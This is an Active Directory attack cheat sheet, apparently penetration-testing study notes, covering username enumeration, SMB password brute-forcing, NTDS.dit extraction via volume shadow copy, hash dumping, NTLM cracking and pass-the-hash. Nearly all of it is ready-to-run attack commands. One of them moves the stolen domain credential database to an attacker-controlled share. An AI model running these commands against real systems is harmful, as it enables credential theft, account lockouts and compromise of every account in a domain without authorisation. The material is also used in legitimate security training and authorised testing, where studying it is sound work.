### Active Directory Enumeration and NTDS.dit Attacks

#### 1. Username Enumeration and OSINT

**When to use:** Before launching password attacks to identify valid **naming conventions** and confirm active accounts to reduce noise and avoid unnecessary lockout risks.

**Operational Workflow:**

1. **Identify Naming Conventions:** Research employee names via social media or company websites. Common patterns include `firstinitiallastname` or `firstname.lastname`.
2. **Analyze Email Structures:** Infer usernames from email formats (e.g., `jdoe@<DOMAIN>` suggests `<USERNAME>` is `jdoe`).
3. **Generate Username Lists:** Use tools to automate the creation of potential username combinations based on identified patterns.
4. **Validate Usernames:** Perform enumeration against the Domain Controller to confirm which generated names are valid.

**Command Reference:**

|Tool|Purpose|Command|
|:--|:--|:--|
|**Username Anarchy**|Convert real names into common username formats|`./username-anarchy -i names.txt`|
|**Kerbrute**|Enumerate valid users via Kerberos without locking accounts|`./kerbrute_linux_amd64 userenum --dc <TARGET_IP> --domain <DOMAIN> usernames.txt`|

---

#### 2. Active Directory Password Attacks

**When to use:** Once a list of valid usernames is obtained and a **foothold** on the internal network is established.

**Scenario Context:**

- **Brute-Force:** Target a specific user with a wordlist. Use when no account lockout policy is enforced (often the default in older or misconfigured environments).
- **Implications:** These attacks are **noisy** and generate significant network traffic and security alerts (Event ID 4776).

**Operational Workflow:**

1. **Launch SMB Brute-Force:** Attempt to authenticate against the Domain Controller using a list of common passwords.

**Command Reference:**

|Tool|Purpose|Command|
|:--|:--|:--|
|**NetExec (SMB)**|Password spraying or brute-forcing via SMB|`netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD_LIST>`|

---

#### 3. NTDS.dit Extraction (Manual Method)

**When to use:** After obtaining credentials for an account with **Local Administrator** or **Domain Administrator** privileges. **Why it matters:** Capturing `NTDS.dit` allows for the extraction of **all domain username hashes**, potentially compromising every account in the domain.

**Operational Workflow:**

1. **Establish Remote Session:** Connect to the Domain Controller.
2. **Verify Privileges:** Confirm the compromised user is in the "Administrators" or "Domain Admins" group.
3. **Create Volume Shadow Copy (VSS):** Since `NTDS.dit` is actively used by the system, a shadow copy is required to bypass file locks.
4. **Exfiltrate Files:** Copy `NTDS.dit` and the `SYSTEM` hive (which contains the decryption key) to the attack machine.
5. **Dump Hashes:** Use offline tools to decrypt and extract the hashes.

**Command Reference:**

|Action|Command|
|:--|:--|
|**Connect to DC**|`evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>`|
|**Check Local Groups**|`net localgroup`|
|**Check User Privs**|`net user <USERNAME>`|
|**Create VSS**|`vssadmin CREATE SHADOW /For=C:`|
|**Copy NTDS.dit**|`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`|
|**Move to Attack Host**|`cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACK_IP>\<SHARE_NAME>`|
|**Offline Hash Dump**|`impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`|

---

#### 4. NTDS.dit Extraction (Automated Method)

**When to use:** When a faster, more streamlined approach is preferred to dump hashes directly within a terminal session.

**Command Reference:**

|Tool|Purpose|Command|
|:--|:--|:--|
|**NetExec (ntdsutil)**|Automates VSS creation and hash dumping in one step|`netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M ntdsutil`|

---

#### 5. Post-Exploitation: Hash Analysis

**When to use:** After successfully dumping hashes from the NTDS database.

**Technique Selection:**

- **Cracking:** Use when cleartext passwords are required for further manual logins.
- **Pass-the-Hash (PtH):** Use for **lateral movement** when cracking is unsuccessful. This leverages the NTLM protocol to authenticate using the hash directly.

**Command Reference:**

| Tool                 | Purpose                                         | Command                                               |
| :------------------- | :---------------------------------------------- | :---------------------------------------------------- |
| **Hashcat**          | Crack NTLM hashes (Mode 1000)                   | `sudo hashcat -m 1000 <HASH> <WORDLIST>`              |
| **Evil-WinRM (PtH)** | Authenticate using a hash instead of a password | `evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTHASH>` |